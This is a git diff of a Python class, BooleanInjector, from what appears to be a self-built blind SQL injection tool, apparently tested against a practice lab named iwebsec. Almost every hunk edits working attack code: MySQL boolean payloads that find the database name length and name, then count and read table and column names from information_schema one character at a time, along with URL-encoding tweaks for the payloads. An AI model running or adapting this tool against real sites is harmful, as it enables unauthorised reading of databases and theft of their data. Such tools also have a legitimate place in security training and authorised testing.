@@ -80,7 +80,6 @@ class BooleanInjector:
         print("params_count:", self.params_count)
         print("params:", self.params)
         print("values:", self.values)
-        print("injectable_params:", self.injectable_params)
         print("injectable_params_index:", self.injectable_params)
         print("injection_type:", self.injection_types)
         if len(self.injectable_params) == 0:
@@ -151,7 +150,8 @@ class BooleanInjector:
             pass
         elif r == 1:
             # print("r=1")
-            payload = payload.replace(" and ", "+and+").replace("#", "%23").replace("=", "%3D").replace(" ", "%20").replace("'", "%27")
+            payload = payload.replace(" and ", "+and+").replace("#", "%23").replace("=", "%3D").replace("'", "%27")
+                # .replace(" ", "%20")
             for param in self.params:
                 payload = payload.replace(f"{param}%3D", f"{param}=")
         elif r == 2:
@@ -176,13 +176,15 @@ class BooleanInjector:
             # print(get_time(), "[info]", "payload constructed:", payload)
             # 确认条件
             if self.normal_response.text == sqli_response.text:
+                # if self.show_payload:
+                # print("\n"+payload)
                 return True
         return False
         # for iwebsec
         # return True if "welcome to iwebsec!!!" in sqli_response.text else False
 
     def get_db_length(self) -> int:
-        for point in range(0, self.injectable_params_count):
+        for point in self.injectable_params:
             for length in range(1, 32):
                 payload = f"and length(database()) = {length} #"
                 if self.get_payload_result(payload, point):
@@ -197,7 +199,7 @@ class BooleanInjector:
     def get_db_name(self):
         extracted_name = ""
         payload_list = []
-        for point in range(0, self.injectable_params_count):
+        for point in self.injectable_params:
             print(get_time(), info, "fetching database name...", end="")
             for i in range(1, self.db_length + 1):
                 # ?? 或许可以尝试使用二分查找提高效率 ??
@@ -223,23 +225,23 @@ class BooleanInjector:
     def get_tables(self):
         table_count = 0
         table_length = []
-        for point in range(0, self.injectable_params_count):
+        for point in self.injectable_params:
             # get tables count
             print(get_time(), info, "fetching tables count...")
-            for length in range(1, 32):
-                payload = f"and (select count(table_name) from information_schema.tables where table_schema=database())={length} #"
+            for count in range(1, 32):
+                payload = f"and (select count(table_name) from information_schema.tables where table_schema=database())={count} #"
                 if self.get_payload_result(payload, point):
                     print(get_time(), info, colored(f"Got table count:", "light_green"),
-                          colored(f"{length} ", "light_yellow"),
+                          colored(f"{count} ", "light_yellow"),
                           end=f" by using payload:\n{colored(self.construct_payload(payload, point), "cyan")}\n"
                           if self.show_payload else "\n")
-                    table_count = length
+                    table_count = count
                     break
             # get tables length
             for table in range(0, table_count):
                 print(get_time(), info, f"fetching No.{table + 1} table length...")
-                for length in range(0, 32):
-                    payload = f"and length((select table_name from information_schema.tables where table_schema=database() limit {table},1))={length}"
+                for length in range(1, 32):
+                    payload = f"and length((select table_name from information_schema.tables where table_schema=database() limit {table},1))={length}#"
                     if self.get_payload_result(payload, point):
                         print(get_time(), info, colored(f"Got No.{table + 1} table length:", "light_green"),
                               colored(f"{length}", "light_yellow"),
@@ -252,7 +254,7 @@ class BooleanInjector:
                         print(get_time(), info, f"fetching No.{table + 1} table name...", end="")
                         for i in range(0, length + 1):
                             for char in range(32, 127):
-                                payload = f"and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {table},1),{i},1))={char} #"
+                                payload = f"and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {table},1),{i},1))={char}#"
                                 if self.get_payload_result(payload, point):
                                     print(chr(char), end="", flush=True)
                                     payload_list.append(self.construct_payload(payload, point))
@@ -274,12 +276,13 @@ class BooleanInjector:
 
     # @restrict_values(self.tables)
     def get_columns(self, witch_table: str = "all"):
-        for point in range(0, self.injectable_params_count):
+        for point in self.injectable_params:
             # get column count
             for table in self.tables:
+                ptable_row = [table]
                 columns_count = 0  # store the count of column in this table
                 for c in range(1, 32):
-                    payload = f"and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name='{table}')={c},1,0) #"
+                    payload = f"and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name='{table}')={c},1,0)#"
                     if self.get_payload_result(payload, point):
                         columns_count = c
                         print(get_time(), info, colored(f"Got table[{table}] columns count:", "light_green"),
@@ -301,6 +304,7 @@ class BooleanInjector:
                     # got this column name by length
                     extracted_name = ""
                     payload_list = []
+                    columns_list = []
                     print(get_time(), info, f"fetching table[{table}] No.{column_index + 1} column name...", end="")
                     for i in range(1, columns_length + 1):
                         for char in range(32, 127):
@@ -315,7 +319,9 @@ class BooleanInjector:
                           colored(f"Got table[{table}] No.{column_index + 1} column name:", "light_green"),
                           colored(extracted_name, "light_yellow"),
                           end=" by using payloads:\n" if self.show_payload else "\n")
-                    # self.ptable.
+
+                    columns_list.append(extracted_name)
+
                     if self.show_payload:
                         for p in payload_list:
                             print(colored(p, "cyan"))
